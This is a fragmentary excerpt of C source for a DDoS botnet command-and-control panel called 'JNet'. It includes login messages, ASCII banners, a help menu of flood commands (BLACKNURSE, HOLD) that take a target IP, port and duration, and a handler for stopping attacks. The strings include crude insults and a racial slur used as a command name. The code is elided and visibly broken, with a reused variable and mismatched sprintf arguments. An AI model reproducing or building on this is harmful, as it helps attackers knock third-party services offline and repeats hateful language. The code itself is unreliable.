/*
       ...
       _ _   _ ______ _______    _____ ______ _______      ________ _____  
      | | \ | |  ____|__   __|  / ____|  ____|  __ \ \    / /  ____|  __ \ 
      | |  \| | |__     | |    | (___ | |__  | |__) \ \  / /| |__  | |__) |
  _   | | . ` |  __|    | |     \___ \|  __| |  _  / \ \/ / |  __| |  _  / 
 | |__| | |\  | |____   | |     ____) | |____| | \ \  \  /  | |____| | \ \ 
  \____/|_| \_|______|  |_|    |_____/|______|_|  \_\  \/   |______|_|  \_\
...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
		...
		sprintf(yes1,  "\e[38;5;93mTunneling your connection through tor... \e[97m[\e[38;5;93m|\e[97m]\r\n", accounts[find_line].username);
		sprintf(yes2,  "\e[38;5;93mRemoving trace of your connection... \e[97m[\e[38;5;93m/\e[97m]\r\n", accounts[find_line].username);
		sprintf(yes3,  "\e[38;5;93mEating your mom out.... \e[97m[\e[38;5;93m-\e[97m]\r\n", accounts[find_line].username);
		sprintf(yes4,  "\e[38;5;93mTwistyyy is a big SKID \e[97m[\e[38;5;93m/\e[97m]\r\n", accounts[find_line].username);
		sprintf(yes5,  "\e[38;5;93mVerifying your credentials...\e[97m[\e[38;5;93m-\e[97m]\r\n", accounts[find_line].username);
...
void *TitleWriter(void *sock) {
  ...
  sprintf(lmao3asciibannerline6,   "\e[96m                ██   ██║██║╚██╗██║██╔══╝     ██║   \r\n");
  ...
  sprintf(lol4asciibannerline5,   "\e[96m               ██   ██║██║╚██╗██║██╔══╝     ██║  \r\n");
  sprintf(lol4asciibannerline6,   "\e[96m               ╚█████╔╝██║ ╚████║███████╗   ██║\r\n");
  ...
  sprintf(xd5asciibannerline5,   "\e[96m               ██   ██║██║╚██╗██║██╔══╝     ██║  \r\n");
  sprintf(xd5asciibannerline6,   "\e[96m               ╚█████╔╝██║ ╚████║███████╗   ██║\r\n");
  ...
  sprintf(haha8asciibannerline5,   "\e[96m               ██   ██║██║╚██╗██║██╔══╝     ██║  \r\n");
  sprintf(haha8asciibannerline6,   "\e[96m               ╚█████╔╝██║ ╚████║███████╗   ██║\r\n");
  ...
  sprintf(lmfao9asciibannerline2,   "\e[96m                   ██╗███╗   ██╗███████╗████████\r\n");
  sprintf(haha8asciibannerline3,   "\e[96m                    ██║████╗  ██║██╔════╝╚══██╔═\r\n");
  sprintf(haha8asciibannerline4,   "\e[96m                    ██║██╔██╗ ██║█████╗     ██║ \r\n");
  sprintf(haha8asciibannerline5,   "\e[96m               ██   ██║██║╚██╗██║██╔══╝     ██║  \r\n");
  sprintf(haha8asciibannerline6,   "\e[96m               ╚█████╔╝██║ ╚████║███████╗   ██║\r\n");
  ...
  sprintf(lmfao9asciibannerline8,   "\e[90m																						\r\n");
		...
		while(1) {
		char input [5000];
        sprintf(input, "\e[38;5;93mJNet\e[97m# ", accounts[find_line].username);
		...
		char input [5000];
        sprintf(input, "\e[38;5;93mHaste\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			...
			if(strstr(buf, "HELP")) {
				...
				sprintf(hp7,  "\e[97m!* BLACKNURSE IP TIME\r\n");
				sprintf(hp8,  "\e[97m!* HOLD IP PORT TIME\r\n");
				sprintf(hp8,  "\e[97m!* JNIGGA IP PORT TIME\r\n");
				sprintf(hp9,  "\e[97m>---\e[38;5;93mServerside Commands\e[97m---<\r\n");
				sprintf(hp10,  "\e[97m!* TELNET \e[38;5;93m| \e[32mON \e[38;5;93m| \e[31mOFF \e[38;5;93m|\r\n");
				sprintf(hp11,  "\e[97mLOGOUT\r\n");
				sprintf(hp12, "\e[97mSTOP\r\n");
				sprintf(hp13, "\e[97mCLEAR\r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "STOP"))
			{
				...
				sprintf(killattack, "\e[97m[\e[38;5;93mJNet\e[97m] \e[31mATTACKS STOPPED\r\n");
